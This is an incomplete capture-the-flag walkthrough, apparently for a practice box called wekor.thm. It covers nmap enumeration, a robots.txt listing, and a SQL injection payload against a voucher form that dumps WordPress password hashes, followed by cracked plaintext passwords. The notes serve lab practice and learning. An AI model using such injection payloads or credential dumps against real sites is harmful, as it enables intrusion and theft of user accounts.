# Introduction

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx wekor.thm
```

# Enumeration

we do a nmap with some options :\
\
-T4 is for have more threads to accelerate the scan\
-p- is to scan all the ports\
-sV is to scan the version\
\
we run the scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -p- -sV wekor.thm
```

we got these open ports
```bash

```

# HTTP (port 80)
robots.txt
```
User-agent: *
Disallow: /workshop/
Disallow: /root/
Disallow: /lol/
Disallow: /agent/
Disallow: /feed
Disallow: /crawler
Disallow: /boot
Disallow: /comingreallysoon
Disallow: /interesting
```


http://wekor.thm/it-next/
http://wekor.thm/it-next/it-cart.php

veulnerability in the add voucher form

' UNION SELECT database(),2,3;#
database() = coupons

table valid_coupons


Coupon Code : 1 With ID : admin And With Expire Date Of : $P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B. Is Valid!
Coupon Code : 1 With ID : wp_jeffrey And With Expire Date Of : $P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10 Is Valid!
Coupon Code : 1 With ID : wp_yura And With Expire Date Of : $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/ Is Valid!
Coupon Code : 1 With ID : wp_eagle And With Expire Date Of : $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/ Is Valid!

xxxxxx           (wp_eagle)
soccer13         (wp_yura)     
rockyou          (wp_jeffrey)
